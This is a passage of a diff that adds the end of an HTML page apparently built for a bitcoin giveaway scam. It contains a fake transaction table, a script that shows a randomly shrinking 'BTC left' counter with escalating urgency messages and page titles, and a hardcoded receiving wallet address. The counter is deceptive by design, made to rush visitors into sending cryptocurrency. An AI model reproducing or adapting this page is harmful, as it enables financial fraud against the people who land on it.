+                slug: "b1cxaqn5"
+            }], "*")
+        }
+    </script>
+    <div class="container">
+        <div class="row header-trans">
+            <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3">TxHash</div>
+            <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">Block</div>
+            <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">Age</div>
+            <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">From</div>
+            <div class="in-trans col-lg-1 col-md-1 col-sm-1 col-xs-1"></div>
+            <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">To</div>
+            <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">Value</div>
+            <div class="tx-fee col-lg-1 col-md-1 col-sm-2 col-xs-2">TxFee</div>
+        </div>
+        <div class="trans-table">
+
+        </div>
+    </div>
+    <!-- ============================================= end ====================================================== -->
+
+    <script type="text/javascript">
+        $(document).ready(function() {
+            $('.spoiler-title').click(function() {
+                $(this).parent().children('div.spoiler-content').toggle('fast');
+                return false;
+            });
+        });
+    </script>
+    <script>
+        function setProgress(count, max) {
+            var p = (100 * count / max).toString() + '%';
+            $('.progress-left').css('left', p);
+            $('.progress-width').css('width', p);
+            var cc = count.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+            var mm = max.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+            $('.progress-bar-value').text(cc + ' / ' + mm);
+
+        }
+
+
+
+        var ctd = setInterval(function() {
+            if (localStorage.getItem("bar")) {
+                if (localStorage.getItem("bar") <= 90) {
+                    var new_count = localStorage.getItem("bar");
+                } else if (localStorage.getItem("bar")) {
+                    var init_count = localStorage.getItem("bar");
+                    var new_count = init_count - Math.floor((Math.random() * 10) * 4 + 5);
+                }
+            } else {
+                var init_count = Math.floor((Math.random() * (5000 - 5000) + 4000) + 1);
+                var new_count = init_count - Math.floor((Math.random() * 10) * 4 + 5);
+            }
+            setProgress(new_count, 5000)
+
+
+
+            localStorage.setItem("bar", new_count);
+
+            if (init_count <= 300)
+                clearInterval(ctd);
+            if (new_count <= 9999 && init_count >= 2001)
+                document.getElementById("leftBTC").innerHTML = "Left BTC";
+            if (new_count <= 700 && init_count >= 301)
+                document.getElementById("leftBTC").innerHTML = "Hurry up, not much more BTC left!";
+            if (new_count <= 300)
+                document.getElementById("leftBTC").innerHTML = "Last chance to get your BTC!";
+            if (new_count <= 1000)
+                document.title = new_count + " BTC left";
+            if (new_count <= 500)
+                document.title = "Get your " + new_count + " BTC now!";
+
+        }, 6666);
+    </script>
+    <script>
+        window.WALLET = '3CpxVjnGiEwMn5XczqGzZPtfkBY3Y5nY1H';
+    </script>
+
+    <script src='https://code.jquery.com/jquery-3.3.1.js'></script>
+    <script type='text/javascript'>
+        $(document).mousemove(function(e) {
+            $('.pointer').css({
+                left: e.pageX,
+                top: e.pageY
+            });
+        })
+    </script>
+</body>
+
+</html>
